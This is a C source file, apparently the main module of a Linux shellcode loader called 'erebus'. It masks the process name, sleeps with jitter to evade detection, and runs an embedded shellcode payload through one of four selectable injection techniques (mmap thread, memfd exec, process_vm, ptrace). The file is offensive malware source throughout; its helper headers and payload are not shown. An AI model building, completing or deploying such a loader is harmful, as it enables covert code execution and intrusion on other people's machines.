#define _GNU_SOURCE
#include <stddef.h>
#include "../include/config.h"
#include "../include/shellcode.h"
#include "../include/evasion.h"
#include "../include/injection.h"

__attribute__((visibility("hidden")))
static void _erebus_run(void)
{
#if CONFIG_GUARDRAILS_ENABLED
    if (!erebus_guardrails_check())
        return;
#endif

#if CONFIG_MASQUERADE_ENABLED
    erebus_masquerade_name(CONFIG_MASQUERADE_NAME);
#endif

#if CONFIG_SLEEP_MS > 0
    erebus_sleep_jitter(CONFIG_SLEEP_MS, CONFIG_SLEEP_JITTER_MS);
#endif

    const unsigned char *sc  = shellcode;
    const size_t         len = sizeof(shellcode);

#if   CONFIG_INJECTION_TYPE == 1
    erebus_mmap_thread(sc, len);
#elif CONFIG_INJECTION_TYPE == 2
    erebus_memfd_exec(sc, len);
#elif CONFIG_INJECTION_TYPE == 3
    erebus_process_vm(sc, len);
#elif CONFIG_INJECTION_TYPE == 4
    erebus_ptrace_inject(sc, len);
#endif
}

int main(void)
{
    _erebus_run();
    return 0;
}
